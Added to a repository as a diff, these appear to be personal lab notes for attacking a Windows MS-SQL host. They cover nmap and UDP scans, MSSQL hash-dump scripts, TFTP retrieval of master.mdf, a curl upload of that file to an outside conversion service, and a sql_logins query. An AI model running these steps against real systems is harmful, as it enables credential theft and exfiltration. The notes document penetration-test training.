@@ -1,0 +1,26 @@
+nmap -sV -sC -Pn 10.11.1.111 > nmap.txt
+nmap -sV -sC -sU -Pn 10.11.1.111 > nmap.txt
+nmap -p- 10.11.1.111 -T5 > nmapall.txt
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.11.1.111
+
+
+nmap --script vuln -sV -p 135,139,445,1433,3389 -Pn  10.11.1.111 > nmapvuln.txt
+nmap --script vuln -sU -p 69,123,137,138,500,3389,4500,5353,5355,27707 -Pn  10.11.1.111
+
+1.nmap掃描出來後必須在使用UDP掃描一次，可以發現TFTP及MS-SQL服務
+2.可以透過TFTP下載檔案,可在31那台查看相對應路徑
+3.上網搜索可以查到ms-sql的密碼檔案在master.mdf
+4.必須使用系統變量的路徑才可下載,不然路徑內有空格,會有異常
+4.需要找到備份的檔案才有權限可以下載,可在31那台搜索路徑發現在templates有備份
+get /PROGRA~1/MICROS~1/MSSQL14.SQLEXPRESS/MSSQL/Binn/Templates/master.mdf
+get /PROGRA~1/MICROS~1/MSSQL14.SQLEXPRESS/MSSQL/Binn/Templates/master.mdf
+
+
+curl -F files[]=@master.mdf https://www.rebasedata.com/api/v1/convert?outputFormat=csv -o output.zip
+
+/PROGRA~1/MICROS~1/MSSQL1~1.SQL/MSSQL/DATA/master.mdf
+
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Template Data
+
+SELECT * FROM sys.sysobjects WHERE id = OBJECT_ID('sys.sql_logins')
